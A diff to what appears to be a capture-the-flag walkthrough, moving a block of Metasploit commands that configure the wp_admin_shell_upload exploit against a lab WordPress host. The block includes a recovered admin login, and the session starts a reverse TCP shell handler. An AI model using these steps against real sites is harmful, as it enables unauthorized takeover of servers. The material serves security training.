@@ -444,6 +444,19 @@ Matching Modules
    45  exploit/unix/webapp/wp_ajax_load_more_file_upload              2015-10-10       excellent  Yes    Wordpress Ajax Load More PHP Upload Vulnerability
 
 msf5 > use 43
+
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > set RHOST 192.168.188.128
+RHOST => 192.168.188.128
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > set RPORT 80
+RPORT => 80
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /
+TARGETURI => wp-login.php
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME elliot
+USERNAME => elliot
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD ER28-0652
+PASSWORD => ER28-0652
+msf5 exploit(unix/webapp/wp_admin_shell_upload) > set WPCHECK false
+WPCHECK => false
 msf5 exploit(unix/webapp/wp_admin_shell_upload) > show options
 
 Module options (exploit/unix/webapp/wp_admin_shell_upload):
@@ -473,18 +486,6 @@ Exploit target:
    Id  Name
    --  ----
    0   WordPress
-msf5 exploit(unix/webapp/wp_admin_shell_upload) > set RHOST 192.168.188.128
-RHOST => 192.168.188.128
-msf5 exploit(unix/webapp/wp_admin_shell_upload) > set RPORT 80
-RPORT => 80
-msf5 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /
-TARGETURI => wp-login.php
-msf5 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME elliot
-USERNAME => elliot
-msf5 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD ER28-0652
-PASSWORD => ER28-0652
-msf5 exploit(unix/webapp/wp_admin_shell_upload) > set WPCHECK false
-WPCHECK => false
 msf5 exploit(unix/webapp/wp_admin_shell_upload) > run
 
 [*] Started reverse TCP handler on 192.168.188.130:4444
